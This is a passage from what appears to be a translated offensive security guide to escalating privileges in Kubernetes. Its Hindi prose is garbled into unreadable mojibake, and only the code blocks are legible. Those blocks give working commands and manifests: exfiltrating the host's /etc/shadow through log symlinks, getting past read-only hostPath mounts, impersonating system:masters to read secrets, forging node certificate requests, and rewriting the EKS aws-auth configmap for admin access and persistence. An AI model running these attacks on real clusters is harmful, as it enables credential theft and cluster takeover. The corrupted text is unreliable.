* рдЕрдкрдиреЗ рдХрдВрдЯреЗрдирд░ рдХреЗ `0.log` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (рдЬреЛ рдЖрдорддреМрд░ рдкрд░ `/var/logs/pods/namespace_pod_uid/container/0.log` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ) рддрд╛рдХрд┐ рдпрд╣ рдПрдХ **рд╕рд┐рдВрдХрдо рд▓рд┐рдВрдХ рд╣реЛ рдЬреЛ `/etc/shadow`** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реЛред рдлрд┐рд░, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдХрд╛ рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ **`nodes/log` рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд╣реИ**, рддреЛ рд╡рд╣ рдмрд╕ `/host-mounted/var/log/sym` рдореЗрдВ `/` рдХреЗ рд▓рд┐рдП рдПрдХ **symlink** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬрдм **`https://<gateway>:10250/logs/sym/` рддрдХ рдкрд╣реБрдБрдЪрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рд╣реЛрд╕реНрдЯ рдХреА рд░реВрдЯ** рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдЧрд╛ (symlink рдХреЛ рдмрджрд▓рдиреЗ рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ)ред
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**рдПрдХ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╢реЛрд╖рдг рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### readOnly рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рдФрд░ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреНрд╖рдорддрд╛ `CAP_SYS_ADMIN` рдЙрдкрд▓рдмреНрдз рд╣реИ, рддреЛ рдЖрдк рдмрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ rw рдХреЗ рд░реВрдк рдореЗрдВ рдлрд┐рд░ рд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд╢реЛрдз**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) рдореЗрдВ рдХрд╣рд╛ рдЧрдпрд╛ рд╣реИ, рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
рдЬреЛ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдЬреИрд╕реЗ рднрд╛рдЧрдиреЗ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдерд╛, рдПрдХ hostPath рдорд╛рдЙрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдПрдХ PersistentVolume рдФрд░ рдПрдХ PersistentVolumeClaim рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд╛рде рдПрдХ рд╣реЛрд╕реНрдЯ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЦрд╛рддреЛрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛**

рдПрдХ [**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдХрд░рдг**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЦрд╛рддрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдмрд╕ `kubectl` рдХрдорд╛рдВрдб рдореЗрдВ `--as=<username>` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╛ `--as-group=<group>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдПрдХ рд╕рдореВрд╣ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
рдпрд╛ REST API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Secrets рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛

**Secrets рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ secrets рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИ** REST API endpoint рддрдХ рдкрд╣реБрдБрдЪрдХрд░:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### рдПрдХ рдЧреБрдкреНрдд рдкрдврд╝рдирд╛ - рдЯреЛрдХрди рдЖрдИрдбреА рдХрд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ

рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдПрдХ рдЯреЛрдХрди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдХрд╛ рд╕рд╣реА рдирд╛рдо рдЪрд╛рд╣рд┐рдП, рдЬрдмрдХрд┐ рд╡реНрдпрд╛рдкрдХ _**рдЧреБрдкреНрдд рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ**_ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рд╡рд┐рдкрд░реАрдд, рдЕрднреА рднреА рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реИрдВред рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдПрдХ рдЧреБрдкреНрдд рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИред рдЗрди рдЧреБрдкреНрддреЛрдВ рдХрд╛ рдирд╛рдо рд╕рдВрд░рдЪрдирд╛ рд╣реЛрддреА рд╣реИ: рдПрдХ рд╕реНрдерд┐рд░ рдЙрдкрд╕рд░реНрдЧ рдХреЗ рдмрд╛рдж рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рдВрдЪ-рдЪрд░рд┐рддреНрд░ рдЕрд▓реНрдлрд╝рд╛рдиреНрдпреВрдореЗрд░рд┐рдХ рдЯреЛрдХрди (рдХреБрдЫ рд╡рд░реНрдгреЛрдВ рдХреЛ рдЫреЛрдбрд╝рдХрд░) [рд╕реНрд░реЛрдд рдХреЛрдб](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) рдХреЗ рдЕрдиреБрд╕рд╛рд░ред

рдЯреЛрдХрди рдПрдХ рд╕реАрдорд┐рдд 27-рдЪрд░рд┐рддреНрд░ рд╕реЗрдЯ (`bcdfghjklmnpqrstvwxz2456789`) рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ, рди рдХрд┐ рдкреВрд░реНрдг рдЕрд▓реНрдлрд╝рд╛рдиреНрдпреВрдореЗрд░рд┐рдХ рд░реЗрдВрдЬ рд╕реЗред рдпрд╣ рд╕реАрдорд╛ рдХреБрд▓ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдВрдпреЛрдЬрдиреЛрдВ рдХреЛ 14,348,907 (27^5) рддрдХ рдХрдо рдХрд░ рджреЗрддреА рд╣реИред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рдВрднрд╡рддрдГ рдХреБрдЫ рдШрдВрдЯреЛрдВ рдореЗрдВ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╣рдорд▓реЗ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЕрдиреБрд░реЛрдз

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рдВрд╕рд╛рдзрди `certificatesigningrequests` рдореЗрдВ **`create`** рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣реИрдВ (рдпрд╛ рдХрдо рд╕реЗ рдХрдо `certificatesigningrequests/nodeClient` рдореЗрдВ)ред рдЖрдк рдПрдХ **рдирдП рдиреЛрдб** рдХрд╛ рдирдпрд╛ CeSR **рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред**

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЗрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрд╡реАрдХреГрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), рддреЛ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ **рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдкрдХреЛ рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХреГрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ `certificatesigningrequests/approval` рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рдФрд░ `signers` рдореЗрдВ `approve` рдХрд░рдирд╛, рдЬрд┐рд╕рдореЗрдВ resourceName `<signerNameDomain>/<signerNamePath>` рдпрд╛ `<signerNameDomain>/*` рд╣реЛред

рдПрдХ **рднреВрдорд┐рдХрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг** рдЬрд┐рд╕рдореЗрдВ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
рддреЛ, рдирдП рдиреЛрдб CSR рдХреЗ рд╕реНрд╡реАрдХреГрдд рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде, рдЖрдк рдиреЛрдбреНрд╕ рдХреА рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛рдИ рдЬрд╛ рд╕рдХреЗ** рдФрд░ **рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдП рдЬрд╛ рд╕рдХреЗрдВ**ред

[**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) рдФрд░ [**рдЗрд╕ рдПрдХ**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) рдореЗрдВ GKE K8s TLS Bootstrap рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░** рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдПрдХ рдирдП K8s рдиреЛрдб рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрди рдкрд░ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛рдИ рдЬрд╛рддреА рд╣реИред\
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ рддреЛ рдЖрдк рд╡рд╣реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓рд╛ рдЙрджрд╛рд╣рд░рдг рдЙрд╕ рддреНрд░реБрдЯрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдирдП рдиреЛрдб рдХреЛ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдиреЛрдб рдХреЗрд╡рд▓ рдЙрди рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВред**

рдЗрд╕рд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдмрд╕ рдпрд╣ рд╣реИ рдХрд┐ **рдЙрд╕ рдиреЛрдб рдирд╛рдо рдХреЗ рд▓рд┐рдП рдиреЛрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдмрдирд╛рдПрдВ рдЬрд╣рд╛рдВ рджрд┐рд▓рдЪрд╕реНрдк рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рд╡рд╛рд▓рд╛ рдХрдВрдЯреЗрдирд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** (рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ, рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS (AWS рдореЗрдВ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ) рдХреНрд▓рд╕реНрдЯрд░реЛрдВ рдкрд░ kube-system namespace рдореЗрдВ **`configmaps`** рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ **aws-auth** configmap рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдХреНрд▓рд╕реНрдЯрд░ рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдБ **`update`** рдФрд░ **`patch`** рд╣реИрдВ, рдпрд╛ рдпрджрд┐ configmap рдирд╣реАрдВ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ **`create`**: 

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
рдЖрдк **`aws-auth`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реНрдерд╛рдпреАрддрд╛** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдЕрдиреНрдп рдЦрд╛рддреЛрдВ** рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **рдПрдХ рдЕрд▓рдЧ рдЦрд╛рддреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛**ред рд▓реЗрдХрд┐рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдпрджрд┐ рдЖрдк рдХреЗрд╡рд▓ рдирд╛рдо рдХреЗ рдмрдЬрд╛рдп рдХреНрд▓рд╕реНрдЯрд░ рдХрд╛ ARN рдбрд╛рд▓рддреЗ рд╣реИрдВред\
`kubectl` рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **рд╢рд┐рдХрд╛рд░рд┐рдпреЛрдВ рдХрд╛ kubeconfig** **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ aws exec args рдореЗрдВ `--profile other_account_role` рдЬреЛрдбрд╝реЗрдВ рддрд╛рдХрд┐ kubectl рдЕрдиреНрдп рдЦрд╛рддреЗ рдХреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗ рдФрд░ AWS рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░ рд╕рдХреЗред
{% endhint %}

### GKE рдореЗрдВ рд╡реГрджреНрдзрд┐ рдХрд░рдирд╛

GCP рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реЛрдВ рдХреЛ K8s рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ **2 рддрд░реАрдХреЗ** рд╣реИрдВред рдХрд┐рд╕реА рднреА рдорд╛рдорд▓реЗ рдореЗрдВ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдХреНрд▓рд╕реНрдЯрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ **`container.clusters.get`** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдпрд╛ рдЖрдкрдХреЛ **рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ kubectl рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓** **рдЬрдирд░реЗрдЯ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдЕрдЧрд▓реЗ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ)ред

{% hint style="warning" %}
K8s рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдмрд╛рдд рдХрд░рддреЗ рд╕рдордп, **GCP рдСрде рдЯреЛрдХрди рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдлрд┐рд░, GCP, K8s рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдкрд╣рд▓реЗ **рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдХрд┐ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** (рдИрдореЗрд▓ рджреНрд╡рд╛рд░рд╛) **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рдкрд╣реБрдВрдЪ рд╣реИ**, рдлрд┐рд░ рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЗрд╕рдХреА **GCP IAM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЛрдИ рдкрд╣реБрдВрдЪ рд╣реИ**ред\
рдпрджрд┐ **рдХреЛрдИ рднреА** рдЗрдирдореЗрдВ рд╕реЗ **рд╕рддреНрдп** рд╣реИ, рддреЛ рдЙрд╕реЗ **рдЙрддреНрддрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдпрджрд┐ **рдирд╣реАрдВ** рддреЛ **GCP IAM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ** рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ **рддреНрд░реБрдЯрд┐** рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

